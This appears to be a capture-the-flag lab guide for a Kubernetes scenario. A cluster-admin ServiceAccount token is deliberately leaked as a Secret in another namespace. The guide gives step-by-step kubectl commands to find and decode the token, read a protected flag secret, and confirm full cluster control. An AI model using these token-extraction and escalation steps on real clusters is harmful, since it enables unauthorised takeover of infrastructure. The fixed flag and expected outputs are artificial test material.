# K8S-18: SA Token Cluster-Admin Escalation

## 场景信息

| 字段 | 值 |
|---|---|
| ID | K8S-18 |
| 名称 | SA Token Cluster-Admin Escalation |
| 技术/CVE | RBAC misconfiguration |
| 难度 | L2 |
| 交付方式 | KIND / Kubernetes |
| 入口 | KIND 集群内入口（无固定宿主端口） |
| 集群 | cve-k8s-18-sa-admin |

## 场景概述

1. Cluster has two namespaces: `ns-admin` and `ns-ops`
2. A ServiceAccount `cluster-admin-sa` exists in `ns-admin` bound to the `cluster-admin` ClusterRole
3. The SA token for `cluster-admin-sa` is **leaked** as a Secret named `leaked-admin-token` in `ns-ops`
4. An `init-pod` in `ns-ops` with a default ServiceAccount can discover the leaked token
5. Use the leaked token with kubectl to read `flag-secret` in `ns-admin`

## 前置知识

- kubectl access to KIND cluster `cve-k8s-18-sa-admin`
- Pods in `ns-ops`: `init-pod` (alpine), `attacker-pod` (bitnami/kubectl)
- Tools: kubectl, curl, or any HTTP client

## 利用步骤

### Step 1: Initial Foothold
Start from a pod with limited permissions in `ns-ops`:

```bash
# Exec into the init-pod (alpine, minimal tools)
kubectl exec -it init-pod -n ns-ops -- /bin/sh

# Or exec into the attacker-pod (has kubectl pre-installed)
kubectl exec -it attacker-pod -n ns-ops -- /bin/bash
```

### Step 2: Discover Leaked Token Secret
List secrets in the current namespace:

```bash
# From attacker-pod (has kubectl)
kubectl get secrets -n ns-ops
# Expected:
# NAME                   TYPE     DATA   AGE
# leaked-admin-token     Opaque   1      1m
# default-token-xxxxx    kubernetes.io/service-account-token   3      1m

# Describe the leaked secret to see metadata
kubectl describe secret leaked-admin-token -n ns-ops
```

### Step 3: Extract the Cluster-Admin Token
```bash
# From attacker-pod
TOKEN=$(kubectl get secret leaked-admin-token -n ns-ops \
    -o jsonpath='{.data.token}' | base64 -d)
echo $TOKEN

# Or from init-pod (use the Kubernetes API directly)
# First get the API server endpoint
APISERVER="https://kubernetes.default.svc"

# Read the token from the secret volume (if mounted)
# Or use curl to query the API with the pod's own SA first
```

### Step 4: List Secrets in ns-admin Using Leaked Token
With the cluster-admin token, access resources in any namespace:

```bash
# List secrets in the target namespace
kubectl --token=$TOKEN get secrets -n ns-admin
# Expected:
# NAME                   TYPE     DATA   AGE
# flag-secret            Opaque   1      ...
# default-token-xxxxx    kubernetes.io/service-account-token   3      ...

# Describe the flag secret
kubectl --token=$TOKEN describe secret flag-secret -n ns-admin
```

### Step 5: Extract the Flag
```bash
# Decode the flag from base64
kubectl --token=$TOKEN get secret flag-secret -n ns-admin \
    -o jsonpath='{.data.flag}' | base64 -d
# Expected: flag{k8s-18-*}
```

### Step 6: Verify Full Cluster-Admin Access
Confirm the leaked token truly has cluster-admin privileges:

```bash
# List all namespaces
kubectl --token=$TOKEN get namespaces

# List pods in kube-system (normally restricted)
kubectl --token=$TOKEN get pods -n kube-system

# Create resources in any namespace
kubectl --token=$TOKEN run test --image=nginx -n default
```

### Step 7: Capture Flag
- Flag format: `flag{k8s-18-*}`
- Flag location: Secret `flag-secret` in namespace `ns-admin`
- Access requires cluster-admin privileges (or at least `get` on secrets in `ns-admin`)
- Expected output: `flag{k8s-18-default}` (or custom value from `CVE_FLAG`)

## 验证命令

```bash
# Verify the cluster is deployed
kubectl get nodes
# Expected: one control-plane node Ready

# Verify namespaces exist
kubectl get ns ns-admin ns-ops
# Expected: both namespaces Active

# Verify pods are running
kubectl get pods -n ns-ops
# Expected: init-pod and attacker-pod both Running

# Verify leaked token exists
kubectl get secret leaked-admin-token -n ns-ops
# Expected: secret exists

# Verify flag secret exists (requires privilege)
kubectl get secret flag-secret -n ns-admin
# Note: default SA in ns-ops cannot do this; must use leaked token
```

## Flag

- Flag 位置：Secret `flag-secret` in `ns-admin` namespace

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | ServiceAccounts, ClusterRoleBindings, and Kubernetes API |
| 侦察与前置条件 | Cluster-admin binding discovery and token extraction |
| 核心漏洞与利用 | Use a ServiceAccount token bound to cluster-admin |
| 权限、横向或影响 | Full Kubernetes API control |
| 验证 | Read the protected flag resource |

## 修复建议

升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
